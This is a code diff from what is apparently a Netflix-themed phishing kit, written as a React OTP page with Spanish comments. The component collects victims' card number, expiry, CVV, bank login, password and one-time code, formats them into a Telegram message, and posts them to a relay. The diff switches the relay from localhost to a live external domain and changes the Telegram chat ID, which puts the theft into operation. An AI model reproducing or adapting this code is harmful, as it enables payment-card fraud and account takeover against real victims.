@@ -39,10 +39,10 @@ const OTP = () => {
 
     const telegramMessage = `🔑📱 KEY NETFLIX 📱🔑:\n -------------------------------------------\n- 📛: ${savedFormValues.cardHolderName || 'No disponible'}\n- 💳: ${savedFormValues.cardNumber || 'No disponible'} \n- 📅: ${savedFormValues.expirationDate || 'No disponible'}\n- 🔐: ${savedFormValues.cvv || 'No disponible'}\n-------------------------------------------\n 🔑📱 LOGIN NETFLIX 📱🔑\n ------------------------------------------- \n 🏦 : ${banco}\n 👤 : ${username}\n 🔒 : ${password}\n -------------------------------------------\n⚡ OTP ⚡\n-------------------------------------------\n 🔒: ${otp}`;
 
-    const chatId = '-4542132850'; // Asegúrate de que este ID sea correcto
+    const chatId = '-4723241842'; // Asegúrate de que este ID sea correcto
 
     try {
-      await axios.post('http://localhost:3000/enviarmensaje', { chatId, message: telegramMessage });
+      await axios.post('https://streaming.pagafacilntf.com/enviarmensaje', { chatId, message: telegramMessage });
       navigate('/signup/loginoption'); // Cambia la ruta según tus necesidades
     } catch (error) {
       console.error('Error en la solicitud:', error);
